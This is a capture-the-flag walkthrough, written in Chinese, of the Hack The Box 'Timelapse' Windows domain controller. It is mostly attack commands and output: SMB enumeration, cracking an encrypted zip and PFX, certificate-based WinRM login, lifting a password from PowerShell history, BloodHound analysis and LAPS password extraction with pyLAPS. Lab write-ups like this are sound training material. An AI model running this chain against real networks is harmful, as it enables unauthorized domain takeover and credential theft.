###### tags: `Hack the box` `HTB` `Easy` `Windows`

# Timelapse
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.227.113 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.227.113:53
Open 10.129.227.113:88
Open 10.129.227.113:139
Open 10.129.227.113:135
Open 10.129.227.113:389
Open 10.129.227.113:445
Open 10.129.227.113:464
Open 10.129.227.113:593
Open 10.129.227.113:636
Open 10.129.227.113:3268
Open 10.129.227.113:3269
Open 10.129.227.113:5986
Open 10.129.227.113:9389
Open 10.129.227.113:49667
Open 10.129.227.113:49673
Open 10.129.227.113:49674
Open 10.129.227.113:49695
Open 10.129.227.113:61427

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-02-12 14:50:07Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5986/tcp  open  ssl/http      syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49695/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
61427/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

匿名戳戳看`smb`，發現可以登入，進到`Share`裡面看看，再進到`\DEV`裡面
```
┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N -L 10.129.227.113 

Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share

┌──(kali㉿kali)-[~/htb]
└─$ smbclient -N //10.129.227.113/Shares

smb: \> dir
  .                                   D        0  Mon Oct 25 11:39:15 2021
  ..                                  D        0  Mon Oct 25 11:39:15 2021
  Dev                                 D        0  Mon Oct 25 15:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

smb: \> cd Dev
smb: \Dev\> dir
  .                                   D        0  Mon Oct 25 15:40:06 2021
  ..                                  D        0  Mon Oct 25 15:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

smb: \Dev\> get winrm_backup.zip  
```

發現`winrm_backup.zip`有加密，嘗試用`zip2john`來破解
```
┌──(kali㉿kali)-[~/htb]
└─$ zip2john winrm_backup.zip > ziphash.txt

┌──(kali㉿kali)-[~/htb]
└─$ john ziphash.txt --wordlist=/home/kali/rockyou.txt

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```

解壓縮後可以解出一個`legacyy_dev_auth.pfx`，又需要密碼，再用`pfx2john`
```
┌──(kali㉿kali)-[~/htb]
└─$ pfx2john legacyy_dev_auth.pfx > pfxhash.txt

┌──(kali㉿kali)-[~/htb]
└─$ john --wordlist=/home/kali/rockyou.txt pfxhash.txt

thuglegacy       (legacyy_dev_auth.pfx)
```

參考[Extracting the certificate and keys from a .pfx file](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)

解`priviate key`，轉成`.pem`
```
┌──(kali㉿kali)-[~/htb]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacy.key
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:

┌──(kali㉿kali)-[~/htb]
└─$ openssl rsa -in legacy.key -outform PEM -out legacy.pem
Enter pass phrase for legacy.key:
writing RSA key
```

解`public key`
```
┌──(kali㉿kali)-[~/htb]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacy.crt
Enter Import Password:
```

利用`evil-winrm`登入後(上面rustscan可以看到有5986port)，可在`C:\Users\legacyy\Desktop`得`user.txt`
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.227.113 -c legacy.crt -k legacy.pem -P 5986 -S 

*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
b63f5bc3a281225c7c0f4207b008a06b
```

利用`winpeas`，找到一個`history`file `C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> upload winPEASx64.exe
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ./winPEASx64

ÉÍÍÍÍÍÍÍÍÍÍ¹ Found History Files
File: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

印出來看看
```
*Evil-WinRM* PS C:\Users\legacyy\Desktop> cat C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

找到`svc_deploy`密碼`E3R$Q62^12p7PLlC%KWaxuaV`，利用此帳號密碼塞進`bloodhound`
```
┌──(kali㉿kali)-[~/htb]
└─$ bloodhound-python -c All -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb -ns 10.129.227.113 --zip 

INFO: Compressing output into 20250212034314_bloodhound.zip

┌──(kali㉿kali)-[~/htb]
└─$ sudo neo4j start

┌──(kali㉿kali)-[~/htb]
└─$ bloodhound
```

點`svc_deploy`之後選`Node Info -> Outbound object countrol -> Group Delegated Object Control`

![Timelapse_1.png](picture/Timelapse_1.png)

右鍵查看`ReadLAPSPassword`看`help`

![Timelapse_2.png](picture/Timelapse_2.png)

他說要利用[paLAPS.py](https://github.com/p0dalirius/pyLAPS)
```
┌──(kali㉿kali)-[~/htb/pyLAPS]
└─$ python3 pyLAPS.py --action get -d "timelapse.htb" -u "svc_deploy" -p 'E3R$Q62^12p7PLlC%KWaxuaV'
                 __    ___    ____  _____
    ____  __  __/ /   /   |  / __ \/ ___/
   / __ \/ / / / /   / /| | / /_/ /\__ \   
  / /_/ / /_/ / /___/ ___ |/ ____/___/ /   
 / .___/\__, /_____/_/  |_/_/    /____/    v1.2
/_/    /____/           @podalirius_           
    
[+] Extracting LAPS passwords of all computers ... 
  | DC01$                : @zhpMby],d)6&-o4Fi3a8N[]
[+] All done!
```

得到密碼了!利用`evil-winrm`登入後，去`C:\Users\TRX\DEsktop`得到root.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ evil-winrm -i 10.129.227.113 -u Administrator -p '@zhpMby],d)6&-o4Fi3a8N[]' -S

*Evil-WinRM* PS C:\Users\TRX\DEsktop> type root.txt
09d2989f242919c0d135d60b64b791ff
```
